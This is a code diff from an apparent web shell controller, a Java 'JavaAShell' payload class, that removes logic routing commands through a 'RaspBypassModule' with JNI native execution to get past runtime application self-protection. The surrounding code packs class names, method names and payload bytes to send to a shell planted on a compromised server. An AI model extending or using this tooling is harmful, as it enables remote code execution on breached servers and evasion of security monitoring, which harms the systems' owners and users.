@@ -89,12 +89,6 @@ public class JavaAShell extends AbstractPayload {
     }
 
     public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
-        // JNI in RaspBypassModule binds by JVM symbol Java_<mangled FQCN>_jniExec; random CtClass names break native libs.
-        if ("RaspBypassModule".equals(protoName)) {
-            String raspFqcn = "shells.plugins.java.assets.RaspBypassModule";
-            this.dynamicClassNameHashMap.put(protoName, raspFqcn);
-            return classContent;
-        }
         if (functions.getCurrentJarFile() == null) {
             this.dynamicClassNameHashMap.put(protoName, protoName);
             return classContent;
@@ -184,17 +178,10 @@ public class JavaAShell extends AbstractPayload {
     public void fillParameter(String className, String funcName, ReqParameter parameter) {
         if (className != null && className.trim().length() > 0) {
             parameter.add("evalClassName", this.getClassName(className));
-            // RASP: use payloadBytes + RaspBypassRouterModule (setSession + execute); native payload must not use evalClassName+Map invoke.
         }
 
         parameter.add("methodName", funcName);
-        byte[] modulePayload = null;
-        if (className != null && "RaspBypassModule".equals(className.trim())) {
-            modulePayload = this.getModulePayloadByFileName("RaspBypassRouterModule.class");
-        }
-        if (modulePayload == null) {
-            modulePayload = this.getModulePayload(funcName);
-        }
+        byte[] modulePayload = this.getModulePayload(funcName);
         if (modulePayload != null) {
             parameter.add("payloadBytes", modulePayload);
         }
